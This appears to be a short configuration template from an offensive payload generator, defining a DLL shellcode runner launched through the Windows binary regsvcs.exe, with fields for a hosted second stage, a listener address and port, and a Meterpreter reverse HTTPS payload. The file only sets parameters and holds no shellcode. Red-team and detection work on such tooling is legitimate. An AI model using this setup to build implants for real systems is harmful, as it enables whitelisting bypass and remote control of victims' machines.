[Type]
name: regsvcs
info: DLL based shellcode runner
template: ./template/SCT/allthethings.template
runInfo: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings_regsvcs.dll

[HostedDomain]
var: http://127.0.0.1
allowWilds: True
help: The domain, IP, or path of your Hosted SCT second stage

[ListenerDomain]
var: 127.0.0.1
allowWilds: True
help: Your listener domain or IP, can be a redirector

[ListenerPort]
var: 443
allowWilds: True
forceInteger: True
help: Your listener port

[Payload]
var: windows/meterpreter/reverse_https
help: The type of payload

[Output]
var: allthethings_regsvcs.cs
allowWilds: True
